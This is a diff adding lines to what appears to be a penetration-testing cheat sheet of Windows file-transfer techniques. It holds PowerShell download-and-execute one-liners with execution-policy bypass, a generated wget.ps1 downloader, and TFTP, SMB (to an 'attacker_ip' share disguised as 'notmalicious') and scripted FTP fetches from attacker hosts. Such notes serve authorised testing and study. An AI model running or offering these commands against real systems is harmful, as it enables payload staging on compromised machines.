@@ -169,6 +169,45 @@ powershell.exe iex (iwr http://ip/file -usebasicparsing)
 powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
 powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
 certutil -urlcache -f http://kali_ip/file file
+
+# Wget.ps1
+echo $storageDir = $pwd >> wget.ps1
+$webclient = New-Object System.Net.WebClient >> wget.ps1
+# Download file from
+$url = "http://<ip>/file_name" >> wget.ps1
+# Save file as
+$file = "file_name"
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+# execute the script as follows
+powershell.exe -nop -ep bypass -nol -noni -f wget.ps1
+
+TFTP
+tftp -i <ip> get file_name
+
+SMB
+# cmd.exe
+net use Z: \\<attacker_ip>\share_name
+# To access the drive
+Z:
+# PowerShell
+New-PSDrive -Name "notmalicious" -PSProvider "FileSystem" -Root "\\attacker_ip\share_name"
+# To access the drive
+notmalicious:
+
+FTP
+ftp <ip>
+ftp>binary
+ftp>get file_name
+
+# One-liner downloader
+# in cmd.exe do not use quotes in an echo command
+echo open <ip> >> download.txt
+echo anonymous >> download.txt
+echo anon >> download.txt
+echo binary >> download.txt
+get file_name >> download.txt
+bye >> download.txt
+ftp -s:download.txt
 ```
 
 * Check for alternate data streams
